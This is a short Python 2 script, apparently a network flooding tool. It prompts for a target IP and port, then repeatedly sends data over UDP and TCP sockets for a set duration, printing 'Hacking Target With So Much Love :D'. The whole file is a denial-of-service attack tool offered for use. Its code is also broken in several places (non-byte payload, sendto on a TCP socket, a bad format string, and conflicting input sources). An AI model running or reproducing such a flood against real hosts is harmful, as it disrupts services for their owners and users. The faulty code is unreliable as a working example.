import socket
import time
import sys

trgt = raw_input("IP : ")
port = input("Port : ")

def flood(trgt, port, duration):
    udp1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bytes = 6000000
    timeout = time.time() + duration
    send = 500

    while 2:
        if time.time() > timeout:
            break
        else:
            pass
            udp1.sendto(bytes, (trgt, port))
            udp2.sendto(bytes, (trgt, port))
            send = send + 2
            print "Hacking Target With So Much Love :D"%(send, trgt, port)
            
def main():
    flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
if __name__ == '__main__':
    main()
